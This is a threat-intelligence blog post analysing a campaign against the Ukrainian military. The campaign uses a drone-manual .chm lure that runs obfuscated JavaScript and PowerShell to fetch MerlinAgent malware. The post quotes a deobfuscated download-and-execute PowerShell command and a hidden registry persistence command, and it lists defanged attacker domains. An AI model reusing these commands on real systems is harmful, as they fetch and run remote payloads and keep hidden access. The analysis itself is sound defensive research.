											<div class="text-block bullets-listing">
											<p>By Securonix Threat Research: D.Iuzvyk, T.Peck, O.Kolesnikov</p>
<p>Sept. 25, 2023, updated Sept. 27, 2023, updated Oct. 6, 2023</p>
<h3>tldr:</h3>
<p>Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.<a href="https://www.securonix.com/wp-content/uploads/2023/09/Drone.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22918 size-full" src="https://www.securonix.com/wp-content/uploads/2023/09/Drone.png" alt="" width="958" height="408" /></a></p>
<p>As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down. New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.</p>
<p>Our team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military. Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.</p>
<p>Last month, the threat group tracked by the identifier <a href="https://cert.gov.ua/article/5391805">UAC-0154</a> was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net). Today, it would appear that the group&#8217;s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.</p>
<h2>Attack chain overview</h2>
<p>The lure file presents itself as a <a href="https://learn.microsoft.com/en-us/dynamicsax-2012/appuser-itpro/deprecated-chm-help-files">Microsoft Help file</a>, or .chm file. The file in this case was named <span style="color: #ff0000;">“Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”</span>. Microsoft help files are a typical file format which are used to provide application support, guides and references. Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.</p>
<p>Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.</p>
<p>The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware. Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.</p>
<p>While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection. We’ll go over each stage in detail further down.</p>
<h2>Initial code execution</h2>
<p>The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine. Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007. They can, however, be opened and executed in modern Windows versions.</p>
<p>Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.</p>
<p>As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image1.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22922 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image1-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm</p>
<p>Code execution through a .chm file is a well known technique and there are several <a href="https://github.com/samratashok/Kautilya/blob/master/extras/Out-CHM.ps1">online tools</a> available for building one. It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.</p>
<p>As we mentioned previously, the lure document was themed as a drone or UAV manual. Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image2.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22926 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image2-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm</p>
<h3>Help file and JavaScript execution [T1059.007]</h3>
<p>Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip. With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image3.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22930 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image3-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm</p>
<p>After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <span style="color: #ff0000;">&lt;script&gt;&lt;/script&gt;</span> tags. Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image4.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22934 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image4-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 4: Example of obfuscated JavaScript code found within page1.html</p>
<h3>PowerShell execution [T1059.001]</h3>
<p>The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window. The PowerShell code is <a href="https://www.securonix.com/blog/hiding-the-powershell-execution-flow/">heavily obfuscated</a> in order to evade detections. Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image5.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22938 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image5-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm</p>
<p>After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code. This time some key information such as C2 URL and payload names become visible. This is seen in the figure below.</p>
<p>Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image6.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22942 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image6-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm</p>
<p>With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing. In general, the script downloads a payload from <span style="color: #ff0000;">hxxps://files.catbox[.]moe/g1h7zr.bin</span> decodes and decrypts it and saves it to the local Appdata folder to <span style="color: #ff0000;">SysctlHost\ctlhost.exe.</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image7.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22946 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image7-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 7: Deobfuscated PowerShell analysis — file download, directory setup</p>
<p>This first bit of the script establishes a few variables such as the C2 URL (<span style="color: #ff0000;">$plUrl</span>), binary path (<span style="color: #ff0000;">$plPathSuffix</span>), decryption key (<span style="color: #ff0000;">$cryptPS</span>) and the XOR mask size value (<span style="color: #ff0000;">$xorMaskSize</span>). The bulk of the code is stored inside the <span style="color: #ff0000;">doS</span> function which is called at the end of the script.</p>
<p>Next the script performs key functions:</p>
<ol>
<li>Constructs the target path.</li>
<li>Checks if the executable file already exists at the defined path, returning -1 if it does.</li>
<li>Ensures that the necessary directory exists, creating it if needed.</li>
<li>Checks the success of directory creation, returning -2 if it fails.</li>
</ol>
<p>The script then downloads the file from the C2 server. The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command:</p>
<p><span style="color: #ff0000;">[System.Net.WebClient]::new().DownloadFile(&#8216;hxxps://files.catbox[.]moe/g1h7zr.bin&#8217;, &#8221;)</span></p>
<p>The command is then executed using an invoke expression (IEX).</p>
<p>Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below:</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image8.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22950 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image8-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 8: Deobfuscated PowerShell — binary file decoding</p>
<p>In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.</p>
<p><strong>Compute the hash and fill the XOR mask </strong></p>
<ol>
<li>A SHA-256 hasher is initialized.</li>
<li>The input string <span style="color: #ff0000;">$cryptPS</span> is hashed to produce an array, <span style="color: #ff0000;">$sha</span>.</li>
<li>This hash is then used to populate the <span style="color: #ff0000;">$xorMask</span> array. If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.</li>
</ol>
<p><strong>File transformation using the XOR mask</strong>:</p>
<ol>
<li>File streams are opened:</li>
</ol>
<ul>
<li><span style="color: #ff0000;">$f1</span> reads from an existing file at the path <span style="color: #ff0000;">$p</span>.<br />
(<span style="color: #ff0000;">$envAppData\sysctlHost\ctlhost.exe</span>)</li>
<li><span style="color: #ff0000;">$f2</span> writes to a new temporary file with the same name as <span style="color: #ff0000;">$p</span> but with a <span style="color: #ff0000;">.tmp</span></li>
</ul>
<ol>
<li>The file at path <span style="color: #ff0000;">$p</span> is processed in chunks of up to 4096 bytes using a buffer $b.</li>
<li>For each chunk:</li>
</ol>
<ul>
<li>Bytes are read into the buffer from <span style="color: #ff0000;">$f1</span>.</li>
<li>Each byte in the buffer is XOR&#8217;d with the corresponding byte from the <span style="color: #ff0000;">$xorMask</span>.</li>
<li>The transformed bytes are then written to the temporary file using <span style="color: #ff0000;">$f2</span>.</li>
</ul>
<ol>
<li>This process continues until the entire file has been read and transformed.</li>
</ol>
<p><strong>Note: </strong>The outer while($false) is odd since it renders the entire subsequent code block ineffective. It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.</p>
<p>With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image9.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22954 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image9-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 9: Stage 3, deobfuscated PowerShell</p>
<p>The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file. The last portion of the script then executes the original file in a few different ways.</p>
<p>The PowerShell script appears to be written with several options and configurations in mind, hence the <span style="color: #ff0000;">$false</span> while statement we mentioned earlier. Also the existence of optional binary file arguments which were set to “null” in this case.</p>
<h2>Binary file analysis</h2>
<p>The Windows binary file downloaded is a 64-bit executable at about 5MB in size. Some additional binary information is highlighted in figure 10 below.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/09/image10.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22958 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/image10-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 10: ctlhost.exe — binary file overview</p>
<p>Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework. Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.</p>
<p>The MerlinAgent framework is an open source C2 framework written in Go. It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads. Attackers can then distribute these payloads and incorporate them into their own malware stager or loader. MerlinAgent has a wide range of capabilities which include:</p>
<ul>
<li>Encrypted C2 communication using TLS</li>
<li>Remote command shell</li>
<li>Module support (such as Mimikatz)</li>
<li>Binary support for exe or dll clients</li>
</ul>

<p>Historically, MerlinAgent has been used by <a href="https://cert.gov.ua/article/5391805">UAC-0154</a> in the past targeting Ukrainian officials, and many TTPs are consistent with past activity.</p>
<p>Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com. It also establishes persistence in the registry by creating a new key called “<span style="color: #ff0000;">ctlhost</span>” located in “<span style="color: #ff0000;">HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run” with the contents “cmd.exe /c start /min %windir%\system32\WindowsPowerShell\v1.0\powershell.exe -command Start-Process -filepath &#8220;C:\Users\[REDACTED]\Appdata\Roaming\sysctlHost\ctlhost.exe&#8221; -WindowStyle Hidden</span>”. This will execute the binary file every time the user logs into the system.</p>
<p>Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.</p>
<h2>Wrapping up…</h2>
<p>It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.</p>
<p>Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file. Typically receiving a Microsoft help file over the internet would be considered unusual. However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .</p>

<h2>Securonix recommendations and mitigations</h2>
<p>Always be extra cautious downloading file attachments from posts for private messages. When it comes to prevention and detection, the Securonix Threat Research Team recommends:</p>
<ul>
<li>Avoid downloading files or attachments from untrusted sources, especially if the source was unsolicited</li>
<li>Monitor common malware staging directories, especially “C:\ProgramData” and other temporary locations such as the user’s local appdata folder which was used in this attack campaign</li>
<li>Deploy additional process-level logging such as <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> and <a href="https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/">PowerShell logging</a> for additional log detection coverage</li>
<li>Securonix customers can scan endpoints using the Securonix Seeder Hunting Queries below</li>
</ul>

<h2><span style="font-weight: 400;">Update: The STARK#VORTEX Attack Campaign Continues as UAC-0154 Tactics Change</span></h2>
<p><b>Update Sept. 29, 2023:</b><span style="font-weight: 400;"> The </span><a href="https://www.securonix.com/blog/threat-labs-security-advisory-new-starkvortex-attack-campaign-threat-actors-use-drone-manual-lures-to-deliver-merlinagent-payloads/"><span style="font-weight: 400;">STARK#VORTEX attack campaign</span></a><span style="font-weight: 400;"> surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors. Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same. </span></p>
<p><span style="font-weight: 400;">The naming scheme of the binary files has also changed. This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game </span><a href="https://www.minecraft.net/en-us"><span style="font-weight: 400;">Minecraft</span></a><span style="font-weight: 400;">. It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads. </span></p>
<p><span style="font-weight: 400;">The lure document has also been retargeted. As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign. </span></p>
<p><img loading="lazy" decoding="async" class="alignnone wp-image-23196 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/STARKVORTEX-update-1-1024x589.png" alt="STARK#VORTEX campaign" width="640" height="368" /></p>
<p><span style="font-weight: 400;">Figure 1: Confidential Offers.chm lure document </span></p>
<p><span style="font-weight: 400;">The help file contains a single html file which executes the malicious JavaScript payload. The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”. When opened, the content of the lure file simply contains a few company logos.</span></p>
<p><span style="font-weight: 400;">Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner. </span></p>
<p><span style="font-weight: 400;"><a href="https://www.securonix.com/wp-content/uploads/2023/09/STARKVORTEX-update-2.png"><img loading="lazy" decoding="async" class="alignnone wp-image-23200 size-large" src="https://www.securonix.com/wp-content/uploads/2023/09/STARKVORTEX-update-2-1024x589.png" alt="" width="640" height="368" /></a></span></p>
<p><span style="font-weight: 400;">Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm</span></p>
<p><span style="font-weight: 400;">The PowerShell script downloads a binary MerlinAgent payload from </span><span style="font-weight: 400;">hxxps://shorturl[.]at/abPU5</span><span style="font-weight: 400;"> which redirects to </span><span style="font-weight: 400;">hxxps://files.catbox[.]moe/sbjchf.mod</span><span style="font-weight: 400;">. The encoded payload is decoded and then executed in almost the same fashion as we saw before. </span></p>
<p><span style="font-weight: 400;">The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “</span><span style="font-weight: 400;">%appdata%/local/games/minecraft.exe</span><span style="font-weight: 400;">” and the C2 beaconing address is </span><span style="font-weight: 400;">listen.serveminecraft[.]net</span><span style="font-weight: 400;">. Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game. This does speculate that it was probably not intended for business systems where games would normally not be found. </span></p>
<h2><span style="font-weight: 400;">Wrapping up…</span></h2>
<p><span style="font-weight: 400;">Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week. The original analysis of the </span><span style="font-weight: 400;">STARK#VORTEX campaign</span><span style="font-weight: 400;"> contains a much more in-depth analysis. Updated IoCs and Seeder hunting queries can be found below.</span></p>
